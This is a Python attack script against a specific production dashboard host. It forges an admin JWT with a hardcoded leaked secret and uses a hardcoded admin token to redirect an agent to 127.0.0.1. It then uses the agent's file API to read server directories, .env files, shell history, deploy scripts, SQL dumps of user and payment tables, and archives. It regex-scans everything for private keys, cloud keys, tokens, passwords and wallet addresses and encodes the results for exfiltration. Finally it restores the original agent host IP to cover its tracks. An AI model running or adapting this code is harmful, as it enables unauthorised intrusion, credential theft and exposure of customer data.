#!/usr/bin/env python3
# i29221 round2 : targeted read of 122.51.1.87 backup/env/deploy rich-files (READ-ONLY)
import os, sys, json, time, base64, hmac, hashlib, subprocess, re, io, gzip, tarfile, zipfile
import urllib.parse as up

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
AID = "agent-b8d7ca0b"
OWNER = "af0a2285-490f-11f1-ac43-525400595be1"
ORIG_IP = "52.53.251.49"
TARGET_ADDRS = ["c56f7063fd6d199ccc443dbbf4283be602d46343", "fe18aa1efa652660f36ab84f122cd36108f903b6"]
DEADLINE = time.time() + 1450

def _b(s):
    if not isinstance(s, str): s = json.dumps(s, ensure_ascii=False, default=str)
    return base64.b64encode(s.encode("utf-8", "replace")).decode()
def R(k, v):
    print("R:%s:%s" % (k, _b(v)), flush=True)
def RCH(k, v, n=16000):
    if not isinstance(v, str): v = json.dumps(v, ensure_ascii=False, default=str)
    for i in range(0, len(v), n):
        print("R:%s#%05d:%s" % (k, i // n, _b(v[i:i+n])), flush=True)
def curl(args, timeout=60):
    try:
        r = subprocess.run(["curl", "-s", "-k", "-m", str(timeout)] + args, capture_output=True, timeout=timeout + 20)
        return r.returncode, r.stdout
    except Exception as e:
        return -1, repr(e).encode()
def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def jload(s):
    try: return json.loads(s)
    except Exception: return None
def qp(p): return up.quote(p, safe="/")
def forge(user_id, role="admin"):
    now = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    p = b64u(json.dumps({"userId": user_id, "email": "p@x", "customer": "aro", "role": role, "iat": now, "exp": now + 86400 * 7}, separators=(",", ":")))
    sig = b64u(hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    return h + "." + p + "." + sig
def call(path, method="GET", body=None, session=None, admin=False, timeout=30, maxlen=90000):
    args = ["--http2", "-A", UA, "-H", "Accept: application/json, text/plain, */*", "-w", "\n__CODE__%{http_code}"]
    if session: args += ["-H", "Cookie: session=" + session]
    if admin: args += ["-H", "Authorization: Bearer " + ADMIN_TOKEN]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET": args += ["-X", method]
    args += ["https://%s%s" % (HOST, path)]
    rc, out = curl(args, timeout=timeout)
    txt = out.decode("utf-8", "replace"); code = ""; i = txt.rfind("__CODE__")
    if i >= 0: code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    return {"code": code, "body": txt[:maxlen], "len": len(txt)}
def flist(path, sess, timeout=40):
    r = call("/api/agents/%s/files?action=list&path=%s" % (AID, qp(path)), session=sess, timeout=timeout, maxlen=400000)
    j = jload(r["body"]); ents = []
    if isinstance(j, dict) and isinstance(j.get("entries"), list):
        for e in j["entries"]:
            ents.append("%s%s [%s]" % (e.get("name"), "/" if e.get("type") in ("dir", "directory") else "", e.get("size")))
    return r["code"], ents, r["body"][:200]
def fread(path, sess, timeout=60):
    r = call("/api/agents/%s/files?action=read&path=%s" % (AID, qp(path)), session=sess, timeout=timeout, maxlen=2000000)
    j = jload(r["body"])
    if isinstance(j, dict) and "content" in j: return r["code"], j.get("content") or "", j.get("size")
    return r["code"], None, r["body"][:200]
def fdownload(path, sess, timeout=240):
    tmp = "/tmp/_dl2.bin"
    args = ["--http2", "-A", UA, "-H", "Cookie: session=" + sess, "-o", tmp, "-w", "%{http_code}", "-m", str(timeout),
            "https://%s/api/agents/%s/files?action=download&path=%s" % (HOST, AID, qp(path))]
    rc, out = curl(args, timeout=timeout)
    code = out.decode("utf-8", "replace").strip()[-3:]
    try: sz = os.path.getsize(tmp)
    except Exception: sz = -1
    return code, sz, (tmp if code == "200" else None)

ETH = re.compile(r"(?<![0-9a-fA-Fx])(?:0x)?(?:[0-9a-fA-F]{64}|[0-9a-fA-F]{40})(?![0-9a-fA-F])")
PATS = [
    ("privkey", re.compile(r"-----BEGIN [A-Z0-9 ]*PRIVATE KEY-----")),
    ("dsn", re.compile(r"(?:postgres(?:ql)?|mysql|redis|mongodb(?:\+srv)?|amqp)://[^\s\"'<>]{6,220}")),
    ("lumii_acct", re.compile(r"LUMII_ACCT_[A-Za-z0-9_]+\s*[=:]\s*[^\s\"'#,]{1,160}")),
    ("acct_pairs", re.compile(r"\b(?:PROD|ADMIN|UBUNTU|DEPLOY|ROOT|LUMII|SSH|LNT|LUMII_PROD|LUMII_ADMIN)_(?:USER|PASS|PASSWORD|PWD|SSH_USER|SSH_PASS)\s*[=:]\s*[^\s\"'#,]{1,160}")),
    ("cloud_ak", re.compile(r"(?:AKID[A-Za-z0-9]{13,40}|LTAI[A-Za-z0-9]{12,40}|AKIA[A-Z0-9]{12,32}|ASIA[A-Z0-9]{12,32}|dckr_pat_[A-Za-z0-9_-]{10,})")),
    ("git_token", re.compile(r"(?:ghp_|gho_|ghs_|ghu_|github_pat_|glpat-|xox[bpar]-)[A-Za-z0-9_-]{8,120}")),
    ("bcrypt", re.compile(r"\$2[aby]\$\d{2}\$[./A-Za-z0-9]{53}")),
    ("jwt_secret", re.compile(r"(?:JWT_SECRET|AUTH_SECRET|SESSION_SECRET|RELAY_JWT_SECRET|DASHBOARD_JWT_SECRET|LUMII_[A-Z_]*SECRET)\s*[=:]\s*[^\s\"'#,]{4,200}")),
    ("secret_kv", re.compile(r"(?i)(?:secret|access_?key|private_?key|token|passw(?:or)?d|api_?key)[A-Za-z0-9_]*\s*[=:]\s*[\"']?[A-Za-z0-9+/=_\-\.]{12,120}")),
    ("zoofi", re.compile(r".{0,50}(?:zoofi|0xC56f7063|0xFE18Aa1E|cloudflared|rathole|frpc|frps).{0,120}")),
]
def scan(tag, text, maxh=10, maxlines=400000):
    out = {"len": len(text)}
    lines = text.splitlines(); out["lines"] = len(lines)
    hits = {}
    for name, rx in PATS:
        got = []
        for i, ln in enumerate(lines[:maxlines]):
            if len(ln) > 30000: ln = ln[:30000]
            m = rx.search(ln)
            if m:
                got.append({"l": i + 1, "v": m.group(0)[:320]})
                if len(got) >= maxh: break
        if got: hits[name] = got
    eth = []
    for i, ln in enumerate(lines[:maxlines]):
        for m in ETH.finditer(ln):
            v = m.group(0); tgt = v.lower().replace("0x", "") in TARGET_ADDRS
            eth.append({"l": i + 1, "v": v[:90], "target": tgt})
            if len(eth) >= 25: break
        if len(eth) >= 25: break
    if eth: hits["eth"] = eth
    if hits: out["hits"] = hits
    return out

def sql_sections(text, tables, maxrows=150):
    out = {}
    lines = text.splitlines(); i = 0
    while i < len(lines):
        m = re.match(r"COPY (?:public\.)?([A-Za-z0-9_]+) \((.*)\) FROM stdin;", lines[i])
        if m and m.group(1) in tables:
            tbl = m.group(1); hdr = lines[i]; rows = []; i += 1
            while i < len(lines) and lines[i].strip() != "\\.":
                rows.append(lines[i][:700]); i += 1
                if len(rows) >= maxrows: break
            out[tbl] = {"hdr": hdr[:900], "n": len(rows), "rows": rows}
        i += 1
    for tbl in tables:
        mm = re.search(r"CREATE TABLE (?:public\.)?" + re.escape(tbl) + r" \(.*?\n\);", text, re.S)
        if mm: out.setdefault("__ddl__", {})[tbl] = mm.group(0)[:2500]
    return out

def read_and_scan(path, sess, results, full_limit=45000, scan_only=False):
    c, content, sz = fread(path, sess)
    if content is None:
        results[path] = {"code": c, "err": sz}
        return None
    s = scan(path, content)
    entry = {"code": c, "size": sz}
    if s.get("hits"): entry["hits"] = s["hits"]
    # raw content for high-value small configs
    if (not scan_only) and (sz or 0) <= full_limit and re.search(r"(?i)(\.(sh|md|yml|yaml|conf|ini|service|toml|cfg|properties|json|txt|mjs|js|ts|env)|env|Caddyfile)$", path):
        entry["content"] = content
    results[path] = entry
    return content

def main():
    sess = forge(OWNER)
    p0 = call("/api/admin/agents", method="PATCH", admin=True, body={"id": AID, "host": "127.0.0.1"}, timeout=30, maxlen=400)
    R("P0", p0["code"])
    c, ents, err = flist("/", sess)
    R("P0_root", "%s %s" % (c, err))
    if c != "200":
        R("ABORT", "session dead")
        call("/api/admin/agents", method="PATCH", admin=True, body={"id": AID, "host": ORIG_IP}, timeout=30)
        return

    # ---------- 1) directory listings (discover hidden-rich dirs) ----------
    LISTDIRS = [
        "/opt/lumii-prod/backups", "/opt/lumii-prod/backups/incident-20261126", "/opt/lumii-prod/data",
        "/opt/lumii-prod/data/org-runtime", "/opt/lumii-prod/deploy", "/opt/lumii-prod/scripts",
        "/etc/lumii", "/var/lib/lumii-ops-agent", "/opt/lumii-registry", "/opt/lumii",
        "/home/ubuntu/Documents", "/home/ubuntu/bin", "/home/ubuntu/qingpu-patch", "/home/ubuntu/vidcheck-stage",
        "/home/ubuntu/backups", "/home/ubuntu/backups/website", "/home/ubuntu/lumii-dashboard/deploy",
        "/home/ubuntu/lumii-agent-ops-platform", "/home/ubuntu/iss781-backup-20261106-000844",
        "/home/ubuntu/db_backups/logs", "/home/ubuntu/lumii-backups", "/opt/backups", "/root",
    ]
    listings = {}
    for d in LISTDIRS:
        c, ents, err = flist(d, sess)
        listings[d] = {"code": c, "entries": ents[:250], "err": err}
        if time.time() > DEADLINE: break
    RCH("LIST", json.dumps(listings, ensure_ascii=False)[:120000])

    # dynamically read .env / .conf / .yml / .sh / .md / .json / .toml / .log found in listed dirs
    EXTL = re.compile(r"(?i)\.(env|conf|ini|ya?ml|sh|md|json|toml|cfg|properties|txt|log|pem|key|cnf|service|timer|htpasswd|sql|mjs|js|ts)$|^Caddyfile$|(^|/)env\.|(^|/)\.?env")
    dyn = []
    for d, info in listings.items():
        for e in info.get("entries", []):
            nm = e.split(" [")[0].rstrip("/")
            if nm.startswith("/") or nm in (".", ".."): continue
            p = (d.rstrip("/") + "/" + nm)
            if not EXTL.search(nm): continue
            if re.search(r"(?i)\.html$", nm): continue
            dyn.append(p)
    dyn = list(dict.fromkeys(dyn))

    ranks = []
    for p in dyn:
        s = 0; low = p.lower()
        if re.search(r"env|secret|cred|acct|account|pass|token", low): s += 10
        if re.search(r"deploy|release|registry|backup|dump|sql", low): s += 6
        s += 3 if re.search(r"\.(sh|env|conf|ini|service|yml|yaml|md|json|toml|mjs|js)$", low) else 0
        ranks.append((s, p))
    ranks.sort(key=lambda x: -x[0])

    results = {}
    nread = 0
    for s, p in ranks:
        if time.time() > DEADLINE or nread >= 45: break
        read_and_scan(p, sess, results)
        nread += 1
        # also try .env sibling backups
    RCH("DYNSCAN", json.dumps(results, ensure_ascii=False)[:900000])

    # ---------- 2) explicit high-value reads ----------
    EXPL = [
        "/home/ubuntu/env.dev.bak-gw-20260812",
        "/home/ubuntu/db_backups/backup.sh.deprecated",
        "/home/ubuntu/db_backups/crontab.bak-20260810-164437",
        "/home/ubuntu/db_backups/upload-cos.mjs",
        "/home/ubuntu/db_backups/package.json",
        "/home/ubuntu/lumii-auto-deploy.log",
        "/home/ubuntu/dbg.mjs", "/home/ubuntu/dec3.mjs", "/home/ubuntu/c2.js",
        "/home/ubuntu/broken-forwards-convfiles-20261008.jsonl", "/home/ubuntu/broken-forwards-messages-20261008.jsonl",
        "/home/ubuntu/merge-forward-4rows-20261010.csv",
        "/home/ubuntu/session-restore-20261013/deleted-rows.tsv",
        "/home/ubuntu/session-restore-20261013/rollback.sql",
        "/home/ubuntu/session-restore-20261013/restore.sh",
        "/home/ubuntu/.bash_history",
        "/opt/lumii-prod-docker/docker-compose.yml", "/opt/lumii-prod-docker/docker-compose.override.yml",
        "/opt/lumii-prod-docker/feishu-ingress.env",
        "/opt/lumii-prod/deploy/release.sh", "/opt/lumii-prod/deploy/center-docker.sh",
        "/opt/lumii-prod/deploy/registry-cutover.sh", "/opt/lumii-prod/deploy/cloud-release.sh",
        "/opt/lumii-prod/deploy/ci-run.sh", "/opt/lumii-prod/deploy/runtime-refresh.sh",
        "/opt/lumii-prod/deploy/center-image.sh", "/opt/lumii-prod/deploy/customer-release.sh",
        "/opt/lumii-prod/deploy/stage-sync.sh", "/opt/lumii-prod/deploy/sandbox-materials.sh",
        "/opt/lumii-prod/deploy/registry-mirror-install.sh", "/opt/lumii-prod/deploy/feishu-ingress-install.sh",
        "/opt/lumii-prod/deploy/publish-lak.sh", "/opt/lumii-prod/deploy/lak-config.template.toml",
        "/home/ubuntu/lumii-dashboard/deploy/lak-config.template.toml",
        "/home/ubuntu/lumii-dashboard/deploy/beta-seed.sh",
        "/home/ubuntu/lumii-agent-ops-platform/DEPLOY.md",
        "/home/ubuntu/lumii-dashboard/DEPLOY.md",
        "/etc/lumii-ops-agent.env",
        "/home/ubuntu/db_backups/logs/backup-202608.log",
        "/home/ubuntu/db_backups/logs/backup-202611.log",
        "/home/ubuntu/db_backups/logs/backup-202610.log",
        "/home/ubuntu/db_backups/logs/backup-202609.log",
        "/home/ubuntu/db_backups/logs/backup-202607.log",
        "/home/ubuntu/db_backups/logs/backup-202612.log",
    ]
    results2 = {}
    nread = 0
    for p in EXPL:
        if time.time() > DEADLINE or nread >= 45: break
        read_and_scan(p, sess, results2, full_limit=60000)
        nread += 1
    RCH("EXPLSCAN", json.dumps(results2, ensure_ascii=False)[:1800000])

    # ---------- 3) SQL section extraction ----------
    sqlout = {}
    TABS = ["users", "user_identities", "user_capabilities", "org_runtimes", "im_credentials", "im_bots",
            "role_assignments", "role_definitions", "projects", "assistants", "assistant_users",
            "org_authorization_modes", "org_permission_revisions", "departments", "department_memberships",
            "conversations", "automation_config"]
    for p in ["/home/ubuntu/db-backups/lumii-prod-20260816-000415.sql", "/home/ubuntu/db-backups/lumii-prod-20260816-083948.sql"]:
        c, content, sz = fread(p, sess)
        if content is None:
            sqlout[p] = {"code": c, "err": sz}; continue
        sec = sql_sections(content, TABS, maxrows=120)
        sqlout[p] = {"size": sz, "scan": scan(p, content), "sections": sec}
    # other-product dump: users + payment channels
    c, content, sz = fread("/home/ubuntu/backups/mysql/lumii-backup-20260510-090334.sql", sess, timeout=120)
    if content is not None:
        sqlout["lumii-backup-20260510-090334.sql"] = {"size": sz, "sections": sql_sections(content, ["users", "payment_channels", "p2p_merchants", "personas"], maxrows=40)}
    else:
        sqlout["lumii-backup-20260510-090334.sql"] = {"code": c, "err": sz}
    RCH("SQL", json.dumps(sqlout, ensure_ascii=False)[:1800000])

    # ---------- 4) small archives ----------
    ARCH = [
        "/home/ubuntu/prod-db-backup-20260823-083442.sql.gz",
        "/home/ubuntu/db-backups/lumii_center-before-release-20260815-1014.sql.gz",
        "/home/ubuntu/iss781v9-src-backup/src-before.tar",
        "/var/log/postgresql/postgresql-16-main.log",
    ]
    archout = {}
    for p in ARCH:
        if time.time() > DEADLINE: break
        c, sz, fp = fdownload(p, sess, timeout=240)
        info = {"code": c, "size": sz}
        if fp:
            try:
                data = open(fp, "rb").read()
                low = p.lower()
                if low.endswith((".tar", ".tgz", ".tar.gz")):
                    bio = io.BytesIO(data)
                    tf = tarfile.open(fileobj=bio, mode="r:")
                    info["members"] = tf.getnames()[:200]
                    joined = []
                    for m in tf.getmembers():
                        if m.isfile() and m.size < 2_000_000:
                            try: joined.append(tf.extractfile(m).read().decode("utf-8", "replace"))
                            except Exception: pass
                    info["scan"] = scan(p, "\n".join(joined))
                elif low.endswith(".gz"):
                    b = gzip.decompress(data)
                    info["size_uncompressed"] = len(b)
                    txt = b.decode("utf-8", "replace")
                    info["scan"] = scan(p, txt)
                    info["sections"] = sql_sections(txt, ["users", "public.users", "payment_channels", "project_accounts", "projects"], maxrows=60)
                else:
                    info["scan"] = scan(p, data.decode("utf-8", "replace"))
            except Exception as ex:
                info["err"] = repr(ex)[:300]
        archout[p] = info
    RCH("ARCH", json.dumps(archout, ensure_ascii=False)[:1500000])

    pr = call("/api/admin/agents", method="PATCH", admin=True, body={"id": AID, "host": ORIG_IP}, timeout=30)
    R("P9", pr["code"])
    print("DONE", flush=True)

if __name__ == "__main__":
    try:
        main()
    except Exception:
        import traceback
        R("FATAL", traceback.format_exc()[:4000])
        try: call("/api/admin/agents", method="PATCH", admin=True, body={"id": AID, "host": ORIG_IP}, timeout=30)
        except Exception: pass
